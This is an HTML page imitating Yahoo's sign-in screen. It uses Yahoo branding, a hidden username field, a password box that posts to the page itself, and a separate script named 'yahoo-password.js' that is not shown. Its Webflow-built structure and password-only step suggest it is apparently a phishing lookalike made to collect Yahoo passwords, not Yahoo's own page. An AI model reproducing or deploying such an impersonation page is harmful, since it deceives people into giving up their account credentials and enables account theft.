<!DOCTYPE html>
<html data-wf-page="yahoo-password" data-wf-site="yahoo">
<head>
  <meta charset="utf-8">
  <title>Sign in - Yahoo</title>
  <meta content="Sign in to your Yahoo account" name="description">
  <meta content="Sign in - Yahoo" property="og:title">
  <meta content="Sign in to your Yahoo account" property="og:description">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="https://uploads-ssl.webflow.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="https://uploads-ssl.webflow.com/img/webclip.png" rel="apple-touch-icon">
</head>
<body>
  <div class="yahoo-container">
    <div class="yahoo-logo">
      <h1>yahoo!</h1>
    </div>
    
    <div class="text-center" style="margin-bottom: 20px;">
      <h2 style="font-size: 24px; margin: 0 0 10px 0; color: #333;">Sign in</h2>
      <p style="color: #666; margin: 0;">using your Yahoo account</p>
    </div>

    <div id="error-message" class="error-message"></div>
    <div id="success-message" class="success-message"></div>

    <form id="password-form" class="yahoo-form" method="POST">
      <input type="hidden" id="username" name="username" value="">
      
      <input 
        type="password" 
        id="passwd" 
        name="passwd" 
        class="yahoo-input" 
        placeholder="Password" 
        required 
        autocomplete="current-password"
      >
      
      <button type="submit" id="submit-btn" class="yahoo-button">
        Next
      </button>
    </form>

    <div class="text-center">
      <a href="#" class="yahoo-link">Forgot password?</a>
    </div>
  </div>

  <script src="yahoo-password.js"></script>
</body>
</html>
